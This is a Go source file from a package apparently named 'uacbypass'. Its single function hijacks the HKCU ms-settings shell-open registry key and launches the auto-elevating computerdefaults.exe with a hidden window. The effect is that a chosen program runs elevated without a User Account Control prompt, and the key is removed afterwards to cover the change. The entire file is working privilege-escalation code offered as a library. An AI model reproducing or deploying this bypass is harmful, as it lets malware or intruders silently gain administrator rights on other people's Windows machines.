// Copyright (c) 2019-2022 0x9ef. All rights reserved.
// Use of this source code is governed by an MIT license
// that can be found in the LICENSE file.
package once

import (
	"os/exec"
	"syscall"
	"time"
	. "uacbypass/pkg"

	"golang.org/x/sys/windows/registry"
)

func ExecComputerdefaults(path string) error {
	k, exists, err := registry.CreateKey(registry.CURRENT_USER,
		"Software\\Classes\\ms-settings\\shell\\open\\command", registry.ALL_ACCESS)
	if err != nil && !exists {
		return err
	}

	defer k.Close()
	defer registry.DeleteKey(registry.CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command")
	if err = k.SetStringValue("", path); err != nil {
		return err
	}
	if err = k.SetStringValue("DelegateExecute", ""); err != nil {
		return err
	}

	time.Sleep(time.Second)
	WithFsr(func() {
		e := exec.Command("computerdefaults.exe")
		e.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		err = e.Run()
	})
	time.Sleep(3 * time.Second)
	return err
}
